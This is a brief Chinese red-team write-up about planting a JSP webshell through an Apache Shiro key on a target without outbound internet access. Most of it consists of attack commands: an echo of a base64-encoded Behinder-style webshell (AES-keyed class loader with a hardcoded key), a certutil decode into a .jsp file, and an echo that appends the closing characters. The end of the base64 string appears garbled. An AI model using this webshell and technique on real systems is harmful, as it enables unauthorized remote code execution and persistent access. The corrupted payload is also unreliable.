## 0x00 碰见shiro问题

  某次HW，AppInfoScanner发现shiro框架，有key，目标不出外网

## 0x01 解决问题

  不出外网，只能写webshell,写webshell方式

  1.小马传大马

  2.echo写webshell

  3.远程下载（目标不出网，该方式取消）

  各种在shiro工具上转码，发现无法成功连接..................最后搞了一圈只能一段一段上传base64编码的shell，然后在解码

```
  echo PCVAcGFnZSBpbXBvcnQ9ImphdmEudXRpbC4qLGphdmF4LmNyeXB0by4qLGphdmF4LmNyeXB0by5zcGVjLioiJT48JSFjbGFzcyBVIGV4dGVuZHMgQ2xhc3NMb2FkZXJ7VShDbGFzc0xvYWRlciBjKXtzdXBlcihjKTt9cHVibGljIENsYXNzIGcoYnl0ZSBbXWIpe3JldHVybiBzdXBlci5kZWZpbmVDbGFzcyhiLDAsYi5sZW5ndGgpO319JT48JWlmIChyZXF1ZXN0LmdldE1ldGhvZCgpLmVxdWFscygiUE9TVCIpKXtTdHJpbmcgaz0iZTQ1ZTMyOWZlYjVkOTI1YiI7c2Vzc2lvbi5wdXRWYWx1ZSgidSIsayk7Q2lwaGVyIGM9Q2lwaGVyLmdldEluc3RhbmNlKCJBRVMiKTtjLmluaXQoMixuZXcgU2VjcmV0S2V5U3BlYyhrLmdldEJ5dGVzKCksIkFFUyIpKTtuZXcgVSh0aGlzLmdldENsYXNzKCkuZ2V0Q2xhc3NMb2FkZXIoKSkuZyhjLmRvRmluYWwobmV3IHN1bi5taXNjLkJBU0U2NERlY29kZXIoKS5kZWNvZGVCdWZmZXIocmVxdWVzdC5nZXRSZWFkZXIoKS5yZWFkTB8dGgAs2x9hC5DC29zRnZp1rhSZaxor2ZYWxzKHBhZ2VDb250ZXh0KQ>1.txt
```


```
certutil -decode 1.txt 2.jsp
```

剩下的四个特殊字符经过echo语句 手动追加到2.jsp末尾

```
echo ^;^}^%^>>2.jsp
```
